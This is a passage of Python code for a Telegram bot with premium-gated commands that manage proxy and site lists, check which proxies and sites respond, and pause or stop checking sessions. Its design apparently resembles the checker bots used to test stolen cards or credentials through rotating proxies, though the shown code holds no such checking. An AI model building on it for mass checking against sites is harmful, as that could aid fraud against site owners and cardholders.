    for i, proxy in enumerate(current_proxies):
        if i in indices: removed.append(html.escape(proxy))
        else: new_proxies.append(proxy)
    if not removed: return await event.reply(f"{E_CROSS} <b>No valid indices found.</b>", parse_mode='html')
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies: await f.write(f"{proxy}\n")
    await event.reply(f"{E_CHECK} <b>Removed {len(removed)} proxies!</b>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
async def clear_all_proxies(event):
    if not is_premium(event.sender_id): return await event.reply(f"{E_CROSS} <b>Access Denied</b>", parse_mode='html')
    current_proxies = load_proxies()
    if len(current_proxies) == 0: return await event.reply(f"{E_CROSS} <code>proxy.txt</code> <b>is already empty.</b>", parse_mode='html')
    async with aiofiles.open(PROXY_FILE, 'w') as f: await f.write("")
    await event.reply(f"{E_CHECK} <b>Cleared all {len(current_proxies)} proxies!</b>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
async def get_all_proxies(event):
    if not is_premium(event.sender_id): return await event.reply(f"{E_CROSS} <b>Access Denied</b>", parse_mode='html')
    current_proxies = load_proxies()
    if not current_proxies: return await event.reply(f"{E_CROSS} <b>No proxies in</b> <code>proxy.txt</code>", parse_mode='html')
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{html.escape(p)}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(f"{E_CLIP} <b>All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}", parse_mode='html')
    else:
        filename = f"proxies_{event.sender_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies): await f.write(f"{i+1}. {proxy}\n")
        await event.reply(f"{E_CLIP} <b>All Proxies ({len(current_proxies)}):</b>\n\nFile attached below.", file=filename, parse_mode='html')
        try: os.remove(filename)
        except Exception: pass

@bot.on(events.NewMessage(pattern=r'^/addproxy'))
async def add_proxy_command(event):
    if not is_premium(event.sender_id): return await event.reply(f"{E_CROSS} <b>Access Denied</b>", parse_mode='html')
    try:
        args = event.message.text.split('\n')
        if len(args) < 2: return await event.reply(f"{E_CROSS} <b>Usage:</b> <code>/addproxy</code> followed by proxies, one per line.", parse_mode='html')
        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add: return await event.reply(f"{E_CROSS} <b>No proxies provided.</b>", parse_mode='html')
        current_proxies = load_proxies()
        new_proxies = []
        for proxy in proxies_to_add:
            if proxy not in current_proxies: new_proxies.append(proxy)
        if not new_proxies: return await event.reply(f"{E_WARN} <b>All provided proxies already exist.</b>", parse_mode='html')
        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies: await f.write(f"{proxy}\n")
        await event.reply(f"{E_CHECK} <b>Added {len(new_proxies)} new proxies!</b>", parse_mode='html')
    except Exception as e: await event.reply(f"{E_CROSS} <b>Error:</b> {html.escape(str(e))}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm(\s+.*)?$'))
async def remove_site_command(event):
    if not is_premium(event.sender_id): return await event.reply(f"{E_CROSS} <b>Access Denied</b>", parse_mode='html')
    try:
        args = event.message.text.split(maxsplit=1)
        if len(args) < 2: return await event.reply(f"{E_CROSS} <b>Usage:</b> <code>/rm https://site.com</code>", parse_mode='html')
        url_to_remove = args[1].strip()
        current_sites = load_sites()
        if url_to_remove not in current_sites: return await event.reply(f"{E_CROSS} <b>Site not found.</b>", parse_mode='html')
        new_sites = [site for site in current_sites if site != url_to_remove]
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites: await f.write(f"{site}\n")
        await event.reply(f"{E_CHECK} <b>Site Removed Successfully!</b>", parse_mode='html')
    except Exception as e: await event.reply(f"{E_CROSS} <b>Error removing site:</b> {html.escape(str(e))}", parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy$'))
async def proxy_command(event):
    if not is_premium(event.sender_id): return await event.reply(f"{E_CROSS} <b>Access Denied</b>", parse_mode='html')
    proxies = load_proxies()
    if not proxies: return await event.reply(f"{E_CROSS} <code>proxy.txt</code> <b>is empty.</b>", parse_mode='html')
    status_msg = await event.reply(f"{E_SPARKLE} <b>Checking {len(proxies)} proxies...</b>", parse_mode='html')
    alive_proxies = []
    dead_proxies = []
    try:
        for i in range(0, len(proxies), 50):
            batch = proxies[i:i + 50]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive': alive_proxies.append(res['proxy'])
                else: dead_proxies.append(res['proxy'])
            await status_msg.edit(f"{E_SPARKLE} <b>Checking proxies...</b>\n\n<b>Checked:</b> {min(len(alive_proxies) + len(dead_proxies), len(proxies))}/{len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Dead:</b> {len(dead_proxies)}", parse_mode='html')
        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies: await f.write(f"{proxy}\n")
        await status_msg.edit(f"{E_CHECK} <b>Proxy Check Complete!</b>\n\n<b>Total:</b> {len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Removed:</b> {len(dead_proxies)}", parse_mode='html')
    except Exception as e: await status_msg.edit(f"{E_CROSS} <b>Error:</b> {html.escape(str(e))}", parse_mode='html')

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    if not is_premium(event.sender_id): return await event.reply(f"{E_CROSS} <b>Access Denied</b>", parse_mode='html')
    sites = load_sites()
    if not sites: return await event.reply(f"{E_CROSS} <code>sites.txt</code> <b>is empty.</b>", parse_mode='html')
    proxies = load_proxies()
    if not proxies: return await event.reply(f"{E_CROSS} <b>No proxies available.</b>", parse_mode='html')
    status_msg = await event.reply(f"{E_SPARKLE} <b>Checking {len(sites)} sites...</b>", parse_mode='html')
    alive_sites = []
    dead_sites = []
    try:
        for i in range(0, len(sites), 10):
            batch = sites[i:i + 10]
            tasks = [test_site(site, random.choice(proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive': alive_sites.append(res['site'])
                else: dead_sites.append(res['site'])
            await status_msg.edit(f"{E_SPARKLE} <b>Checking sites...</b>\n\n<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Dead:</b> {len(dead_sites)}", parse_mode='html')
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites: await f.write(f"{site}\n")
        await status_msg.edit(f"{E_CHECK} <b>Site Check Complete!</b>\n\n<b>Total Sites:</b> {len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Removed:</b> {len(dead_sites)}\n\n<code>sites.txt</code> <b>has been updated.</b>", parse_mode='html')
    except Exception as e: await status_msg.edit(f"{E_CROSS} <b>Error:</b> {html.escape(str(e))}", parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    session_key = f"{event.sender_id}_{event.message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    session_key = f"{event.sender_id}_{event.message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed")

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    session_key = f"{event.sender_id}_{event.message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 Stopped")
        await event.edit(f"{E_CROSS} <b>Checking stopped by user.</b>", parse_mode='html')

if __name__ == '__main__':
    print("✅ Bot started successfully!")
    bot.run_until_disconnected()
